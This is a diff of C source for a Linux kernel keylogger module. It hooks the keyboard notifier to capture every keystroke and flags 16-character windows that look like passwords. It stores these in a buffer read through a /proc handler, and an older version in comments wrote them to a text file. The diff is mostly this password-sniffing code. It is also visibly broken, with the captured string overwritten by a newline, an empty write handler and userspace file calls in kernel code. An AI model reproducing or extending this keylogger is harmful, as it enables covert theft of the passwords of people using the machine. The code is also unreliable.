@@ -13,6 +13,8 @@ char passwrite[100][16];//
 char passbuffer[100 * 16];//
 int keypress = 1;//
 int passcount2 = 0;//
+int ps = 0;//
+bool needsWriting = false;
 
 
 size_t tcount = 0;
@@ -42,14 +44,31 @@ ssize_t read_proc(struct file* filp, char *buf, size_t count, loff_t *offp)
 		return strlen(passbuffer);
 	}
 	return 0;
+	//return strlen(passbuffer);
 }
-
+ssize_t write_proc(struct file* filp, char *buf, size_t count, loff_t * offp)
+{
+	/*if(needsWriting == true)
+	{
+		needsWriting = false;
+		strcpy(buf, passcount2);
+		//strcpy(buf, "\n");
+		//return strlen(passcount2);
+		//return strlen(passbuffer);
+		//sprintf(passwrite, "%s", (char*)passcount2);
+		//strcpy(buf, passcount2 + "\n");
+		//return strlen(passcount2 + "\n");
+	}
+	return passcount2;
+	//return strlen(passbuffer);
+	*/
+}
 struct file_operations pfo = {
 	read : read_proc,
 	write: 0
 };
 
-char input[16] = {';',';',';',';',';',';',';',';',';',';',';',';',';',';',';',';'};
+char input[16] = {';',';',';',';',';',';',';',';',';',';',';',';',';',';',';','\0'};
 
 void isPassword(char letter)
 {
@@ -62,14 +81,14 @@ void isPassword(char letter)
 	char numbers[10] = {'0','1','2','3','4','5','6','7','8','9'};
 	bool num = false;
 	int i;
+	int j;
 
 	for(i = 1; i < 16; i++)
 	{
 		input[i-1] = input [i];
 	}
-	input[15] = letter;
+	input[14] = letter;
 	
-	int j;
 	for (i = 0; i < 16; i++)
 	{
 		int curVal = input[i];
@@ -101,21 +120,43 @@ void isPassword(char letter)
 
 		if ((sym + num + low + cap) >= 3)
 		{
+			cap = false;
+			low = false;
+			num = false;
+			sym = false;
 			printk("Writing this into a file!\n");
-			strcpy(passwrite[passcount2],input);
-			/*
+			if (passcount2 > 99)
+			{
+				break;
+			}
+			strcpy(passwrite[passcount2], input);
+			strcpy(passwrite[passcount2], "\n");
+			needsWriting = true;
+			passcount2++;
+			//cpy_to_usr(buf, passbuffer, strlen(passbuffer));
+/*
+			write(passwrite);
+			write(passbuffer);
+			ps++;
+			if(ps>15)
+			{
+				ps=0;
+			}
+			passcount2 += 1;
+			i=1;
 			FILE * fp;
 			fp = fopen("Home/Desktop/possiblePasswords.txt","a");
 			for(i = 0; i < 15; i++)
 			{
 				fprintf(fp, "%c", input[i]);
 			}
-			fprintf(fp, "%c \n", input[15]);
-			*/
+			printk(fp, "%c \n", input[15]);
+*/
 		}
 		else
 		{
 			printk("Something went wrong!\n");
+			//input[passcount] = letter;		CHANGE
 			/*
 			printk("Total is: %d \n", (sym + num + low + cap));
 			printk("Array is: %c %c %c \n", input[13], input[14], input[15]);
@@ -130,12 +171,12 @@ void isPassword(char letter)
 
 void checkCharacters(int button, int shift, int down)
 {
+	bool found=false;
 	char letter;
 	char check;
 	check = (char)button;
 	
-	bool found;
-	found = false;
+	//found = false;
 	if (down == 1 && shift == 0)
 	{	
 		//input[15] = 10;
@@ -523,6 +564,8 @@ int kb_notifier_fn(struct notifier_block *nb, unsigned long action, void* data){
 	struct keyboard_notifier_param *kp = (struct keyboard_notifier_param*)data;
 	checkCharacters(kp->value, kp->shift, kp->down);
 	keypress = 1;
+	printk("You have = %i",ps);
+	printk(" characters valid for a password\n");
 	printk("action = %lu Key:  %d  Lights:  %d  Shiftmap:  %x Down:  %d \n Input:  %s \n", action,  kp->value, kp->ledstate, kp->shift, kp->down, input);
 	if(action == 1 && kp->down)
 		tcount++;
@@ -545,6 +588,7 @@ void cleanup(void) {
 MODULE_LICENSE("GPL"); 
 module_init(init);
 module_exit(cleanup);
+
 
 //Optional
 /*
